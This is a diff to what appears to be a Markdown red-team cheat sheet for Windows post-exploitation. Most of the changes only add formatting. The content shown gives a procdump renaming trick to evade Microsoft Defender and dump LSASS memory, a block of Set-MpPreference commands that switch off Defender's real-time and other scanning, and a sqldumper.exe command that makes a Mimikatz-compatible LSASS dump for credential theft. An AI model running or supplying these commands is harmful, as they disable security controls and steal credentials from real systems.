@@ -59,11 +59,12 @@ C:\Users\{username}\AppData\Roaming\Notepad++\backup
 
 # Procdump.exe 
 
-If you rename procdump.exe to dump64.exe and place it in the "C:\Program Files (x86)\Microsoft Visual Studio\*" folder, you can bypass Defender and dump LSASS.
+If you rename __procdump.exe to __dump64.exe__ and place it in the "C:\Program Files (x86)\Microsoft Visual Studio\*" folder, you can bypass Defender and dump __LSASS__.
 
 
 # Disable Defender 
 
+```powershell
 shell Set-MpPreference -DisableRealtimeMonitoring $true 
 shell Set-MpPreference -EnableRealtimeMonitoring $true
 Set-MpPreference -DisableArchiveScanning $true
@@ -74,10 +75,13 @@ Set-MpPreference -DisableScanningNetworkFiles $true
 Set-MpPreference -MAPSReporting 0
 Set-MpPreference -DisableCatchupFullScan $True
 Set-MpPreference -DisableCatchupQuickScan $True
+```
 
 # SQldumper LSASS
 
 0x01100:40 flag will create a Mimikatz compatible dump file.
-sqldumper.exe 540 0 0x01100:40
-Usecase: Dump LSASS.exe to Mimikatz compatible dump using PID.
+
+__sqldumper.exe__ 540 0 0x01100:40
+
+Usecase: Dump __LSASS.exe__ to Mimikatz compatible dump using PID.
 
